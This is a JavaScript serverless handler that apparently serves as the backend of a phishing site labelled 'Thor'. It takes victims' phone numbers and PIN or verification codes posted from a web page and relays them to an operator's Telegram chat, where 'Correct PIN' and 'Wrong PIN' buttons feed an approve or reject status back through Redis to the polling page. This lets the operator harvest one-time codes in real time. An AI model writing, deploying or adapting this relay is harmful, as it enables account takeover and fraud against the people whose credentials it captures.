export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
    const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;

    // 1. GET Request (Website Polling)
    if (req.method === 'GET') {
        try {
            const { userId } = req.query;
            if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Database env vars missing' });
            const dbRes = await fetch(`${REDIS_URL}/get/status_${userId}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
            const dbData = await dbRes.json();
            return res.status(200).json({ status: dbData.result || 'pending' });
        } catch (error) {
            return res.status(500).json({ error: 'Database error' });
        }
    }

    // 2. POST Request from Website (Send to Telegram)
    if (req.method === 'POST' && req.body && req.body.action === 'send_verification') {
        try {
            const { phone, pin, userId, type } = req.body; 
            
            if (!BOT_TOKEN || !ADMIN_CHAT_ID) return res.status(500).json({ error: 'Missing Telegram settings.' });

            const text = `# Thor - ${type.toUpperCase()} Verification\n\n` +
                         `• Phone Number: ${phone}\n` +
                         `• ${type.toUpperCase()} Code: ${pin}\n` +
                         `• Username: user_${userId}`;

            // SEND TO TELEGRAM FIRST
            const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: text,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "✅ Correct PIN", callback_data: `approve_${userId}_${type}` }],
                            [{ text: "❌ Wrong PIN", callback_data: `reject_${userId}_${type}` }]
                        ]
                    }
                })
            });

            const tgData = await tgRes.json();
            if (!tgRes.ok) return res.status(500).json({ error: tgData.description });

            // SAVE TO DATABASE SECOND
            if (REDIS_URL && REDIS_TOKEN) {
                await fetch(`${REDIS_URL}/set/status_${userId}/pending`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
            }

            return res.status(200).json({ success: true });
        } catch (error) {
            return res.status(500).json({ error: error.message });
        }
    }

    // 3. POST Request from Telegram (Admin clicks a button)
    if (req.method === 'POST' && req.body && req.body.callback_query) {
        try {
            const { id, data, message } = req.body.callback_query;
            const [action, userId, type] = data.split('_'); 
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: id }) });
            
            const status = action === 'approve' ? 'approved' : 'rejected';
            if (REDIS_URL && REDIS_TOKEN) {
                await fetch(`${REDIS_URL}/set/status_${userId}/${status}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
            }

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    message_id: message.message_id,
                    reply_markup: { inline_keyboard: [[{ text: status === 'approved' ? "✅ APPROVED" : "❌ REJECTED", callback_data: "noop" }]] }
                })
            });
            return res.status(200).send('OK');
        } catch (error) {
            return res.status(500).send('Error');
        }
    }
    return res.status(200).send('OK');
    }
